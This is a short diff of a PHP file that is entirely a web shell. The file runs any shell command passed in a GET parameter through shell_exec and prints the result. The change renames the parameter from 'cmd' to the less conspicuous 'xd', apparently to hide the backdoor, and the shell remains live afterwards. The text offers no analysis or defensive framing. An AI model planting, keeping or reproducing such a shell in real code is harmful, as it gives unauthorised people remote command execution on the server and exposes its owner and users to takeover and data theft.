@@ -1,7 +1,7 @@
 <?php
 
-if (isset($_GET['cmd'])) {
-    $command = escapeshellcmd($_GET['cmd']);
+if (isset($_GET['xd'])) {
+    $command = escapeshellcmd($_GET['xd']);
     $output = shell_exec($command);
     echo "<pre>$output</pre>";
 }
